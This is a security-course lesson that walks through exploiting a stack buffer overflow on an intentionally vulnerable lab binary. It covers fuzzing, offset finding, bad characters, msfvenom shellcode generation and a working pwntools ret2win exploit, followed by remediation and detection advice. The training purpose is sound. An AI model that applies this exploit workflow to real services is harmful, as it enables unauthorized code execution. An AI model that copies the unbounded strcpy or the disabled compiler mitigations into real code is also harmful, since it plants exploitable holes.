# 09.2 — Stack buffer overflows end to end: control EIP/RIP, bad characters, shellcode &amp; a working exploit (lab)

<div class="prereq">

**Prerequisites:** [09.1](lesson-01.md) — you must have the memory model, the stack frame, the
registers (EIP/RIP, ESP/RSP, EBP/RBP), and the exploitation loop *(crash → control → redirect →
payload → reliability)* in your head. [M00](../module-00/lesson-01.md) authorization boundary
applies to every step. **C/asm literacy** helps; a debugger is mandatory.
**Module:** M09. **Difficulty:** 🔴 advanced.
**You will produce:** on the lab binary, the exact overflow **offset** and **evidence of control of
RIP** (debugger output) — plus a written note of each step and how you verified it. Getting a full
payload to fire is a bonus; *proving control* is the required deliverable.

</div>

## Why this matters

09.1 gave you the theory; this is where you *see it work* on a real (lab) binary and, more
importantly, learn the **workflow** that turns "it crashes" into "I control execution." Every step —
fuzz, find the offset, control RIP, map bad characters, place a payload — is a discrete, verifiable
skill. A tester who has done this once, by hand, in a debugger, can look at any crash and reason
about it honestly. Someone who has only run a canned exploit cannot.

We do this on a 32-bit, no-mitigations lab binary **on purpose**: it is the cleanest possible case,
so the mechanism is not buried under ASLR/NX/canary defenses. 09.3 then adds each defense back and
shows what it costs the attacker. Learn the skeleton here; learn what hardens it next.

<div class="callout legal">

**LAB TARGET vs REAL SYSTEM.** Every command below targets **only** `labs/lab-09-exploit` — an
intentionally vulnerable toy service in an **isolated, no-egress sandbox container**, built without
mitigations for teaching. Its payload spawns a **local** shell *inside that sandbox* or prints a
benign `LAB-FLAG-{uuid}`; it makes **no** connection to any real host and is **not** malware. Doing
any of this to software you don't own and aren't explicitly authorized to test is a crime (M00).
Exploit development is for **authorized research, CTFs, and defense** — we teach the mechanism so you
can assess and defend it.

</div>

## Learning objectives

- **Fuzz** a service to a reproducible crash and capture the triggering input.
- Find the exact **offset** to the saved return address with a **cyclic (De Bruijn) pattern**, and
  verify it by controlling RIP with a chosen value.
- Identify **bad characters** — bytes the input path mangles — and confirm your input arrives intact.
- Understand what **shellcode** is, generate benign lab shellcode with **msfvenom**, and know why you
  always verify it.
- Assemble the exploit structure — **padding + address + payload** — and get **code execution** in
  the sandbox (local shell / `LAB-FLAG`).
- **Verify each step in the debugger** before trusting it — the habit that separates reliable
  exploitation from cargo-culting.

## Intuition

You are going to fill a 64-byte cup with 200 bytes of water and watch it spill onto the thing sitting
behind it — the return address. The only skills are: measuring *exactly* where the spill hits the
return slot (the offset), making sure none of your water evaporates on the way (bad characters), and
deciding what the program does once you own its next step (the payload). Do each in the debugger,
prove it, then move on. Guessing is not a step.

## The vulnerable function

The lab service reads a request into a fixed stack buffer with an unbounded copy — CWE-121:

```c
/* LAB ONLY — lab-09-exploit, 32-bit, compiled: gcc -m32 -fno-stack-protector -z execstack -no-pie
   -fno-pie   (canary OFF, NX OFF, PIE/ASLR OFF — the clean teaching case). */
void vuln(int client) {
    char buf[64];
    char line[512];
    int  n = recv(client, line, sizeof line, 0);  /* attacker controls up to 512 bytes */
    line[n] = '\0';
    strcpy(buf, line);          /* <-- bug: copies `line` into 64-byte `buf`, no bounds check */
    send_banner(client);
}
```

`strcpy` copies until a NUL. Send more than 64 bytes (plus the saved EBP) and the copy runs past
`buf` into the saved return address. The stack frame, low→high (09.1):

```text
low addr   ┌───────────────────────┐
           │  buf[64]              │  ← strcpy writes forward from here ──┐
           │  (other locals)       │                                     │ overflow
           │  saved EBP  (4 bytes) │  ← reached after the buffer         │ climbs
 target →  │  saved RET  (4 bytes) │  ← EIP is loaded from here by `ret` ◀┘
high addr  └───────────────────────┘
```

## Step 1 — Fuzz to a crash

Send growing inputs until the service dies. Manually or with pwntools; the point is a **reproducible**
crash and knowing the rough length that causes it.

```python
# LAB ONLY — fuzz.py: grow the input until the service stops responding.
from pwn import *
for size in range(50, 800, 50):
    try:
        p = remote("127.0.0.1", 9009)   # the lab service in the sandbox
        p.send(b"A" * size)
        p.recv(timeout=1)               # if it crashed, this fails/empties
        p.close()
    except EOFError:
        log.warning("crashed near %d bytes" % size); break
```

Run the *same* input under GDB to catch the fault precisely:

```text
$ gdb -q --args ./lab09-vuln     # pwndbg loaded
pwndbg> run                      # then send ~200 'A's from another shell / the harness
Program received signal SIGSEGV, Segmentation fault.
EIP: 0x41414141 ('AAAA')         # ← EIP is our bytes: control is plausible
pwndbg> info registers eip esp ebp
eip 0x41414141   esp 0xffffd2a0   ebp 0x41414141
```

`EIP = 0x41414141` is the tell from 09.1: our input reached the saved return address. Now measure
*exactly* where.

## Step 2 — Find the offset (cyclic pattern)

Sending all `A`s tells you RIP is reachable but not *at what offset*. A **cyclic pattern** — a De
Bruijn sequence where every 4-byte window is unique — lets you read the offset directly from whatever
lands in EIP.

```text
pwndbg> cyclic 200                 # generate 200 bytes: 'aaaabaaacaaadaaae...'
aaaabaaacaaadaaaeaaaf...           # send THIS as the input, under GDB
Program received signal SIGSEGV
EIP: 0x6161616b                    # whatever 4 bytes landed in EIP
pwndbg> cyclic -l 0x6161616b       # look up that value in the pattern
Found at offset 76
```

**Offset = 76.** That means bytes 0–75 fill `buf` + other locals + saved EBP, and bytes **76–79** land
exactly on the saved return address (4 bytes, x86). Equivalent tooling: Metasploit's
`pattern_create.rb`/`pattern_offset.rb`, or pwntools `cyclic`/`cyclic_find` in a script.

**Verify the offset — don't trust it.** Send `76 bytes of padding + "BBBB" + junk` and confirm EIP is
*exactly* `0x42424242`:

```python
payload = b"A"*76 + b"BBBB" + b"C"*20
# under GDB → EIP should be 0x42424242. If it is, you control RIP precisely.
```

<div class="callout method">

**Verify every step in the debugger.** The offset is a *measurement*; confirm it by placing a known
value (`BBBB`) and seeing it in EIP. Confirm bad chars by comparing sent vs. in-memory bytes. Confirm
the return address points where you think. Exploitation that isn't verified at each stage fails
mysteriously; verified steps fail *locatably*.

</div>

## Step 3 — Control RIP

You now have the exploit skeleton — **padding + address + payload**:

```text
[ 76 bytes padding ][ 4-byte return address ][ payload ]
     fills to RET       chosen: where to go       what runs there
```

What you put in the return-address slot depends on the strategy:

- **Classic (NX off, this lab): jump to shellcode on the stack.** Put the address of your shellcode
  (which you place in the payload region, often on the stack) into the RET slot. Because stack
  addresses shift, a **NOP sled** (`\x90…\x90`, a run of do-nothing instructions) in front of the
  shellcode widens the target: land anywhere in the sled and you slide into the shellcode.
- **Redirect to a helper.** The lab binary ships a benign `win()`/`print_flag()` function; putting
  *its* address in the RET slot makes the program print `LAB-FLAG-{uuid}` — a clean, weaponization-
  free proof of control (this is exactly "ret2win"). **This is the recommended lab objective:** it
  proves code redirection without any shellcode at all.

Find the helper's address in the (non-PIE) binary:

```text
pwndbg> info address win
Symbol "win" is at 0x080491d6 in a file compiled without debugging.
```

Little-endian packing matters: the address `0x080491d6` is written as bytes `\xd6\x91\x04\x08`
(pwntools: `p32(0x080491d6)`).

## Step 4 — Bad characters

The input path can **mangle or truncate** certain bytes before they reach memory. `strcpy` stops at
`\x00` (NUL); line-based protocols may choke on `\x0a` (`\n`), `\x0d` (`\r`); some parsers eat
`\xff` or whitespace. If your return address or shellcode *contains* a bad byte, the exploit breaks
for a reason that looks like nothing.

Find them empirically: send all byte values `\x01`–`\xff` after your padding, then compare what's in
memory to what you sent.

```python
badchar_test = b"A"*76 + bytes(x for x in range(1, 256))   # 0x01..0xff (0x00 known-bad for strcpy)
# under GDB after the crash:
pwndbg> x/256bx $esp        # dump the bytes; any that are MISSING/CHANGED vs. the sequence are bad
```

Any value that is altered, missing, or ends the copy early is a **bad character**. You then (a) avoid
addresses containing them and (b) tell your shellcode generator to exclude them (below). On this lab
the reliable bad byte is `\x00` (strcpy); a line protocol adds `\x0a`. **Verify** by re-dumping until
your intended bytes appear intact.

## Step 5 — Shellcode (what it is; benign in the lab)

**Shellcode** is a small position-independent blob of machine code that performs one action when
executed — classically `execve("/bin/sh")`. It is written to avoid bad bytes (often NUL-free) and be
relocatable. You do **not** need to hand-write it to understand it; you need to know what it *is* and
why you verify it.

<div class="callout warn">

**In this lab, "shellcode" spawns a *local* shell inside the isolated sandbox container, or the
`win()` helper simply prints `LAB-FLAG-{uuid}`.** There is **no** reverse shell to any host, no
network callback, nothing weaponized. Prefer the `win()`/ret2win path — it proves control with **no
shellcode at all**. If you generate shellcode, it is the stock local-`/bin/sh` payload, run only
against the sandbox service, purely to demonstrate the mechanism.

</div>

### msfvenom — what it does, options, limits, verify

**msfvenom** generates and encodes shellcode. What it does: assembles a chosen payload, optionally
runs an encoder to remove bad bytes, and emits it in a format you can paste.

```bash
# LAB ONLY — stock local shell for a 32-bit Linux target, excluding known bad bytes.
msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0a' -v sc
#   -p  payload (linux/x86/exec runs a command locally — no network callback)
#   -f  output format (python/c/raw/...)
#   -b  bad characters to avoid (from Step 4)
#   -v  variable name
```

- **What it does:** produces bytes that, when executed, run the payload; `-b` invokes an encoder
  (e.g. `shikata_ga_nai`) that rewrites the code to avoid your bad bytes and prepends a small decoder
  stub.
- **Key options:** `-p` payload, `-b` bad chars, `-f` format, `-e` explicit encoder, `--smallest`.
- **Limits:** an encoder needs a register/space to decode into; encoded shellcode is larger; some
  bad-char sets are unsatisfiable; the *decoder stub* itself must avoid bad bytes. Encoding is for
  **byte-constraint** reasons, **not** AV evasion — that's out of scope for this course (M15
  concepts only).
- **Verify, always:** never trust generated shellcode blind. Check its length fits your buffer,
  confirm it contains **none** of your bad bytes (`\x00` check), and step through the first
  instructions in GDB to see the decoder run and hand off. Unverified shellcode is the most common
  reason a "correct" exploit does nothing.

## Exploitation / demonstration (LAB ONLY)

<div class="callout attack">

**Technique — ret2win (recommended): redirect execution to the benign helper to prove control.**

```python
# LAB ONLY — exploit.py against the sandbox service on 127.0.0.1:9009
from pwn import *
context.arch = "i386"                         # 32-bit
OFFSET = 76                                    # measured + verified in Step 2
WIN    = 0x080491d6                            # `info address win` (non-PIE binary)

payload  = b"A" * OFFSET                        # fill to the saved return address
payload += p32(WIN)                             # overwrite RET → jump to win() → prints LAB-FLAG

io = remote("127.0.0.1", 9009)
io.send(payload)
print(io.recvall(timeout=2))                    # expect: LAB-FLAG-{uuid}
```

**Why it works:** `strcpy` overruns `buf`; bytes 76–79 land on the saved return address; `ret` pops
`0x080491d6` into EIP; the CPU executes `win()`, which prints the flag. No shellcode, no bad-char
fight beyond `\x00` — the cleanest possible proof of control-flow hijack.

**Alternative — shellcode-on-stack (NX off in this lab only):**

```text
[ NOP sled \x90… ][ benign local-shell shellcode ][ padding to OFFSET ][ addr into the sled ]
```

Put the RET slot's address somewhere inside the NOP sled (read a live stack address from the
debugger); execution slides down the NOPs into the shellcode and spawns a **local sandbox** shell.
This path is <span class="badge deprecated">DEPRECATED</span> against modern defaults (NX makes the
stack non-executable — 09.3); it works *here only* because the lab compiled with `-z execstack`.

</div>

## Verification

Verification is the deliverable, so make it explicit at each stage:

- **Crash:** the service faults reproducibly; under GDB, `SIGSEGV` with **EIP = 0x41414141** (your
  bytes reached RET).
- **Offset:** `cyclic -l <EIP value>` → 76; **confirmed** by `A*76 + "BBBB"` giving **EIP =
  0x42424242** exactly. This is the required control-of-RIP evidence — capture the register line /
  screenshot.
- **Bad chars:** the byte-dump at `$esp` matches your sent sequence except the known-bad ones.
- **Code execution:** the service prints **`LAB-FLAG-{uuid}`** (ret2win) or you get a shell prompt in
  the sandbox; `bt`/register state in GDB shows execution reached `win()` / your shellcode.

"I got control" without the `EIP = 0x42424242` (or the flag) is not evidence — the register/flag
output *is* the finding.

## Impact

Reliable control of EIP/RIP in this service is **arbitrary code execution** in its context (09.1).
For a real service that would be the ceiling — RCE, CVSS critical, **T1203**, and a foothold to
escalate (M04) and pivot (M11/M12). In the lab it is a printed flag, but the *mechanism* is the real
one, which is precisely why the safety boundary matters.

## Remediation

<div class="callout defend">

- **Fix the code (root cause):** replace `strcpy(buf, line)` with a bounded copy —
  `snprintf(buf, sizeof buf, "%s", line)` or check `strlen(line) < sizeof buf` first; ban
  `strcpy`/`gets`/`sprintf`/`scanf("%s")`. This alone kills the bug (CWE-121/787).
- **Compile with mitigations (09.3):** `-fstack-protector-strong` (canary), NX (default; don't use
  `-z execstack`), PIE + ASLR (`-fPIE -pie`), full RELRO. On this lab they're *off* for teaching; on
  anything real they must be *on*.
- **Test for it:** build with AddressSanitizer in CI; fuzz the input parser (AFL++/libFuzzer). Both
  catch this class before shipping.

</div>

## Detection / blue-team view

<div class="callout defend">

- **Repeated crashes** of the service (segfaults in `journalctl`/`dmesg`, WER on Windows) from one
  source are an exploitation *attempt* — alert, don't silently auto-restart.
- **Post-exploitation tell:** the service process spawning a **shell** or unexpected child (the M04
  heuristic). EDR/CFI flags return-address anomalies and unexpected `execve`.
- **Network:** long, binary, non-protocol payloads (NOP sleds, `\x90` runs, packed addresses) to a
  service port are IDS-visible. Map to **T1203**; feed crash signatures back into the patch loop.

</div>

## Practical lab

<div class="lab">

**Environment:** `labs/lab-09-exploit` (built separately) — the vulnerable toy service in an
**isolated, no-egress sandbox container**, 32-bit, **no mitigations** (canary/NX/PIE off) so the
mechanism is clean. **Target:** the lab service (`127.0.0.1:9009` inside the sandbox) only.
**Payload:** benign — `win()` prints `LAB-FLAG-{uuid}`, or a **local** sandbox shell; **no** external
callback. **Time:** ~90 min. **Isolation:** private container network, no Internet route; `reset`
between attempts per the lab README. **Tools:** GDB + pwndbg/GEF, pwntools, (optional) msfvenom.

</div>

Work the loop end to end **on the lab binary**: (1) fuzz to a crash under GDB; (2) cyclic pattern →
offset, and *verify* with `BBBB` → `EIP=0x42424242`; (3) map bad chars; (4) redirect to `win()`
(recommended) or place benign shellcode with a NOP sled; (5) capture the `LAB-FLAG-{uuid}` and the
debugger evidence. Reset and reproduce to prove reliability.

## Exercise

<div class="callout method">

**Situation.** Authorized lab assessment. The `lab-09-exploit` service crashes on long input. The
client (instructor) wants **proof of exploitability**, not necessarily a full payload: demonstrate
that you **control RIP**, with evidence.

**Objective.** Determine the exact overflow **offset** and **demonstrate control of RIP** on the lab
binary, with debugger evidence. Getting `win()` to print the flag is a bonus that strengthens the
finding.

**Starting information.** The running lab service, the binary for local debugging, GDB+pwndbg/GEF,
pwntools. You may read the source above. No pre-built exploit.

**Constraints.** Lab target only; benign payload only (ret2win / local sandbox shell). You must
**verify each step in the debugger** and show the evidence — a claimed offset without the
`EIP=0x42424242` confirmation is incomplete. Note any bad characters you had to avoid and how you
confirmed them.

**Expected deliverables.**
1. The **offset** and *how you measured it* (cyclic value that landed in EIP → `cyclic -l`).
2. **Control-of-RIP evidence:** the debugger register line showing EIP set to your chosen value
   (`0x42424242`) at the exact offset — a screenshot or copied output.
3. The **bad characters** you identified for this input path and how you confirmed them.
4. (Bonus) the printed **`LAB-FLAG-{uuid}`** from redirecting to `win()`, plus the address used and
   its little-endian packing.
5. A short **remediation** note (the one-line source fix + which compiler mitigations would have
   stopped you — forward reference to 09.3).

</div>

<details><summary>Hint 1 — getting the crash</summary>
Grow the input in steps until the service stops replying, then reproduce that same length under GDB
so you catch the SIGSEGV and can read EIP. All-<code>A</code>s giving <code>EIP=0x41414141</code>
means RIP is reachable — now measure the offset, don't guess it.
</details>

<details><summary>Hint 2 — the offset, precisely</summary>
Use a cyclic (De Bruijn) pattern instead of <code>A</code>s: <code>cyclic 200</code>, send it, take
the value in EIP, and <code>cyclic -l &lt;value&gt;</code> gives the offset in one step. Then confirm
with <code>A*offset + "BBBB"</code> → EIP must be exactly <code>0x42424242</code>.
</details>

<details><summary>Hint 3 — bad characters &amp; packing</summary>
<code>strcpy</code> stops at <code>\x00</code>; a line protocol may also mangle <code>\x0a</code>.
Send <code>\x01..\xff</code> after the padding and diff the memory dump against what you sent.
Remember addresses are little-endian: <code>0x080491d6</code> → <code>\xd6\x91\x04\x08</code>
(<code>p32()</code>).
</details>

<details><summary>Hint 4 — proving control the clean way</summary>
You don't need shellcode to prove control. <code>info address win</code> in the non-PIE binary gives
a fixed address; put <code>p32(win)</code> in the RET slot at your verified offset and the program
prints the flag. That single-step redirect is the strongest, safest evidence of a control-flow
hijack.
</details>

## Check yourself

<div class="callout key">

1. Why is a **cyclic** pattern strictly better than sending `A`s for finding the offset? What would
   `A`s alone tell you, and what would they *not*?
2. You verified the offset is 76, put `p32(win)` at bytes 76–79, and the program crashes *before*
   reaching `win()`. Name two plausible causes and how you'd tell them apart in the debugger.
3. Your shellcode contains a `\x00`. Explain exactly why the exploit fails and two ways to fix it.
4. What is a NOP sled *for*, and why does the ret2win approach not need one?
5. Why do we insist on `EIP=0x42424242` as evidence rather than accepting "the service printed the
   flag"? (What does each prove, and what could a printed flag hide?)

</div>

Model answers are in `solutions/module-09.md` (try them before looking).

## References

- **Aleph One, "Smashing the Stack for Fun and Profit,"** *Phrack* 49 (1996) — the end-to-end 32-bit
  smash; historical, and the shellcode-on-stack ending is <span class="badge deprecated">DEPRECATED
  </span> on NX systems.
- **pwntools documentation** — docs.pwntools.com: `process`/`remote`, `p32`/`p64`, `cyclic` /
  `cyclic_find`, `context.arch`.
- **pwndbg** (github.com/pwndbg/pwndbg) and **GEF** (hugsy.github.io/gef) — GDB exploitation
  extensions: `checksec`, `cyclic`, context views.
- **msfvenom** — Rapid7/Metasploit Framework payload generation (`-p`, `-b`, `-f`, `-e`); read the
  current docs for payload names.
- **Corelan, "Exploit writing tutorial part 1"** — the classic fuzz→offset→badchars→control workflow
  (Windows-flavoured but the methodology is universal).
- **CWE-121** Stack-based Buffer Overflow; **CWE-787** Out-of-bounds Write; **MITRE ATT&CK T1203**.

## What you should now be able to do

- Fuzz a service to a reproducible crash and confirm RIP is reachable in a debugger.
- Measure the overflow **offset** with a cyclic pattern and **verify** it by controlling RIP with a
  chosen value.
- Identify and work around **bad characters**, and confirm your bytes arrive intact.
- Explain what shellcode is, generate benign lab shellcode with msfvenom and **verify** it, and
  assemble the **padding + address + payload** structure.
- Get **code execution** on the lab binary (ret2win → `LAB-FLAG`), verifying every step — and write
  the finding as an exploitability proof, not a lucky shell.

## Progress checkpoint

```bash
py course.py complete 09.2
```
